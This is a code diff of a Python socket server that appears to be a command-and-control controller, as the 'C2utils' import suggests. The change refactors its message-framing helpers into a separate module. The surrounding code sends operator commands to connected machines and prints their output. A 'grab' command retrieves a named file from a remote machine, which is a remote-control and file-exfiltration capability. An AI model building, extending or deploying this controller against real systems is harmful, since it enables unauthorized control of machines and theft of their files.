@@ -3,7 +3,7 @@ import socket
 import threading
 import tqdm
 import os
-
+from C2utils import snd_msg, get_msg
 
 r = open("../port", 'r')
 port = int(r.readline())
@@ -31,20 +31,6 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
 connected_machines = []
 
-## ========  Functions  ========
-
-def snd_msg(conn, msg):
-    message = msg.encode(FORMAT)
-    length = str(len(message)).encode(FORMAT)
-    length += b' ' * (HEADER - len(length))
-    conn.send(length)
-    conn.send(message)
-
-def get_response(conn):
-    msg_length = conn.recv(HEADER).decode(FORMAT)
-    msg_length = int(msg_length)
-    msg = conn.recv(msg_length).decode(FORMAT)
-    return msg
             
 # Processes the user input
 def handle_user():
@@ -71,7 +57,7 @@ def handle_user():
                 length += b' ' * (HEADER - len(length))
                 data['conn'].send(length)
                 data['conn'].send(message)
-                resp = get_response(data['conn'])
+                resp = get_msg(data['conn'])
                 print(resp)
                 print("=============================================")
                 itr = itr + 1
@@ -100,7 +86,7 @@ def handle_user():
                     length += b' ' * (HEADER - len(length))
                     data['conn'].send(length)
                     data['conn'].send(message)
-                    resp = get_response(data['conn'])
+                    resp = get_msg(data['conn'])
                     print(resp)
 
             if not sent:
@@ -113,7 +99,7 @@ def handle_user():
                     snd_msg(data['conn'], "grab")
                     print(f"filename: {cmd_lst[1]}")
                     snd_msg(data['conn'], cmd_lst[1]) ## Sending ip the file name to grab
-                    resp = get_response(data['conn'])
+                    resp = get_msg(data['conn'])
                     
                     if resp != "SUCCESS":
                         print(resp)
@@ -121,7 +107,7 @@ def handle_user():
 
                     # receive the file infos
                     # receive using client socket, not server socket
-                    received = get_response(data['conn'])
+                    received = get_msg(data['conn'])
                     filename, filesize = received.split(SEPARATOR)
                     print(f'filename: {filename}, fsize: {filesize}')
         
